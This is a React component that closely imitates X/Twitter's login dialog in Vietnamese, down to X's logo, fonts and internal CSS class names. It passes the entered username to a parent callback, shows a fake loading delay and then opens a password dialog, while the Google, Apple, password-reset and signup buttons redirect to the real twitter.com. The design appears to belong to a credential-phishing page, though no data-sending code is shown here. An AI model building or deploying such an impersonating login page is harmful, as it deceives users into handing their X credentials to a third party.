/* eslint-disable react/prop-types */
import ButtonSignInApple from "./ButtonSignInApple";
import ButtonSignInGoogle from "./ButtonSignInGoogle";
import Input from "./Input";
import Button from "./Button";
import { useRef, useState } from "react";

const SignInDialog = ({
    onClose,
    onNext,
    hideLoading,
    showLoading,
    showEnterPwDialog,
}) => {
    const [username, setUsername] = useState("");
    const ip = useRef();

    const handleNext = () => {
        onNext(username);

        if (!username.trim()) {
            ip.current.focus();
            return;
        }

        showLoading();

        setTimeout(() => {
            onClose();
            hideLoading();
            showEnterPwDialog();
        }, 2000);
    };

    return (
        <div className='sign-in-dialog'>
            <div
                className='overlay'
                style={{
                    position: "fixed",
                    top: 0,
                    right: 0,
                    bottom: 0,
                    left: 0,
                    backgroundColor: "rgba(0, 0, 0, 0.4)",
                    zIndex: 6888,
                }}
            ></div>

            <div
                className='content'
                style={{
                    position: "fixed",
                    top: "50%",
                    right: "50%",
                    maxWidth: "600px",
                    width: "100%",
                    height: "650px",
                    transform: "translate(50%, -50%)",
                    backgroundColor: "white",
                    zIndex: 7999,
                    borderRadius: "20px",
                    display: "flex",
                    flexDirection: "column",
                    // padding: "40px 30px",
                }}
            >
                <div
                    style={{
                        display: "flex",
                        padding: "16px",
                        paddingBottom: 0,
                        alignItems: "center",
                        justifyContent: "space-between",
                    }}
                    className='dialog-header'
                >
                    <div
                        style={{
                            cursor: "pointer",
                        }}
                        onClick={onClose}
                    >
                        <svg
                            style={{
                                width: "20px",
                                height: "20px",
                            }}
                            viewBox='0 0 24 24'
                            aria-hidden='true'
                        >
                            <g>
                                <path d='M10.59 12L4.54 5.96l1.42-1.42L12 10.59l6.04-6.05 1.42 1.42L13.41 12l6.05 6.04-1.42 1.42L12 13.41l-6.04 6.05-1.42-1.42L10.59 12z'></path>
                            </g>
                        </svg>
                    </div>

                    <div>
                        <svg
                            style={{
                                width: "30px",
                                height: "30px",
                            }}
                            viewBox='0 0 24 24'
                            aria-label='X'
                            role='img'
                        >
                            <g>
                                <path d='M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z'></path>
                            </g>
                        </svg>
                    </div>

                    <div></div>
                </div>

                <div
                    className='dialog-content'
                    style={{
                        display: "flex",
                        flexDirection: "column",
                        alignItems: "center",
                    }}
                >
                    <div
                        style={{
                            minWidth: "360px",
                            maxWidth: "360px",
                            padding: "0 32px",
                            paddingBottom: "48px",
                        }}
                    >
                        <div
                            style={{
                                margin: "20px 0",
                                marginBottom: "30px",
                            }}
                        >
                            <h1
                                style={{
                                    fontSize: "29px",
                                    lineHeight: "36px",
                                    fontFamily:
                                        'TwitterChirp, -apple-system, "system-ui", "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
                                }}
                            >
                                Đăng nhập vào X
                            </h1>
                        </div>

                        <div
                            style={{
                                marginBottom: "20px",
                            }}
                        >
                            <ButtonSignInGoogle
                                onClick={() => {
                                    window.location =
                                        "https://twitter.com/i/flow/login";
                                }}
                            />
                        </div>

                        <div>
                            <ButtonSignInApple
                                onClick={() => {
                                    window.location =
                                        "https://twitter.com/i/flow/login";
                                }}
                            />
                        </div>

                        <div
                            style={{
                                width: "300px",
                                marginTop: "8px",
                                marginBottom: "8px",
                            }}
                            className='css-1dbjc4n r-1p6iasa r-17w48nw r-1ipicw7'
                        >
                            <div
                                style={{
                                    display: "flex",
                                    alignItems: "center",
                                    marginTop: "4px",
                                    marginBottom: "4px",
                                    marginLeft: "-8px",
                                    marginRight: "4px",
                                }}
                                className='css-1dbjc4n r-18u37iz r-lz04qo r-1p6iasa'
                            >
                                <div
                                    style={{
                                        flex: 1,
                                        alignItems: "center",
                                        marginLeft: "8px",
                                        marginRight: "8px",
                                    }}
                                    className='css-1dbjc4n r-13awgt0 r-1iusvr4 r-1777fci r-4amgru r-bcqeeo'
                                >
                                    <div
                                        style={{
                                            width: "100%",
                                            height: "1px",
                                            backgroundColor:
                                                "rgb(239, 243, 244)",
                                        }}
                                        className='css-1dbjc4n r-1sw30gj r-109y4c4'
                                    ></div>
                                </div>

                                <div className='css-1dbjc4n r-hvzyjp r-1iusvr4 r-4amgru r-bcqeeo'>
                                    <div
                                        dir='ltr'
                                        className='css-901oao r-18jsvk2 r-37j5jr r-a023e6 r-16dba41 r-rjixqe r-bcqeeo r-qvutc0'
                                    >
                                        <span
                                            style={{
                                                fontSize: "17px",
                                                fontWeight: 400,
                                                fontFamily:
                                                    'TwitterChirp, -apple-system, "system-ui", "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
                                            }}
                                            className='css-901oao css-16my406 r-poiln3 r-bcqeeo r-qvutc0'
                                        >
                                            hoặc
                                        </span>
                                    </div>
                                </div>

                                <div
                                    style={{
                                        flex: 1,
                                        alignItems: "center",
                                        marginLeft: "8px",
                                        marginRight: "8px",
                                    }}
                                    className='css-1dbjc4n r-13awgt0 r-1iusvr4 r-1777fci r-4amgru r-bcqeeo'
                                >
                                    <div
                                        style={{
                                            height: "1px",
                                            backgroundColor:
                                                "rgb(239, 243, 244)",
                                        }}
                                        className='css-1dbjc4n r-1sw30gj r-109y4c4'
                                    ></div>
                                </div>
                            </div>
                        </div>

                        <div>
                            <Input
                                label='Số điện thoại, email hoặc tên người dùng'
                                innerref={ip}
                                value={username}
                                onChange={(e) => {
                                    setUsername(e.target.value);
                                }}
                                onKeyDown={(e) => {
                                    if (e.code === "Enter") {
                                        handleNext();
                                    }
                                }}
                            />
                        </div>

                        <div style={{ marginTop: "20px" }}>
                            <Button onClick={handleNext} backgroundColor='#000'>
                                Tiếp theo
                            </Button>
                        </div>

                        <div style={{ marginTop: "20px" }}>
                            <Button
                                onClick={() => {
                                    window.location =
                                        "https://twitter.com/i/flow/password_reset?input_flow_data=%7B%22requested_variant%22%3A%22eyJwbGF0Zm9ybSI6IlJ3ZWIifQ%3D%3D%22%7D";
                                }}
                                color='#000'
                                outline
                            >
                                Quên mật khẩu?
                            </Button>
                        </div>

                        <div
                            dir='ltr'
                            style={{
                                marginTop: "40px",
                                color: "rgb(83, 100, 113)",
                            }}
                        >
                            <span>
                                <span
                                    style={{
                                        fontSize: "15px",
                                        fontWeight: 400,
                                        fontFamily:
                                            'TwitterChirp, -apple-system, "system-ui", "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
                                    }}
                                >
                                    {"Không có tài khoản? "}
                                </span>
                            </span>
                            <span
                                role='button'
                                style={{
                                    color: "rgb(29, 155, 240)",
                                    fontSize: "15px",
                                    fontWeight: 400,
                                    fontFamily:
                                        'TwitterChirp, -apple-system, "system-ui", "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
                                }}
                            >
                                <span
                                    onClick={() => {
                                        window.location =
                                            "https://twitter.com/i/flow/signup?input_flow_data=%7B%22requested_variant%22%3A%22eyJyZWRpcmVjdF91cmwiOiIvP2xvZ291dD0xNjk5MjAyNjc1NDk0In0%3D%22%7D";
                                    }}
                                >
                                    <span
                                        style={{
                                            cursor: "pointer",
                                            color: "rgb(29, 155, 240)",
                                            fontSize: "15px",
                                            fontWeight: 400,
                                            fontFamily:
                                                'TwitterChirp, -apple-system, "system-ui", "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
                                        }}
                                    >
                                        Đăng ký
                                    </span>
                                </span>
                            </span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    );
};

export default SignInDialog;
